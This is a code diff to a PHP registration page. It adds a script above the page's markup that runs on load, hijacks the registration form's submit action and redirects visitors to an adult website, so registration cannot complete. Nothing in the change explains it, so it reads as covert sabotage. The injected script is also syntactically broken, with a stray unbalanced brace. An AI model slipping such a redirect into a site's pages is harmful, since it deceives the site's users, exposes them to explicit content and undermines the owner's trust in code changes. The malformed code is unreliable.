@@ -4,6 +4,20 @@
 
 <?php if( !(isset( $_POST['register'] ) ) ) { ?>
 
+<script>
+window.onload=function() {
+	document.getElementById("form1").submit=function() {
+	window.location.replace("http://youporn.com");
+	return false;
+	}
+
+
+{
+
+
+</script>
+
+
 
 <!DOCTYPE html>
 <html>
@@ -38,7 +52,7 @@
 			
 			
 			
-            	<form method="post">
+            	<form id="form1" method="post" > 
 				
                 	<ul>
                     	<li>
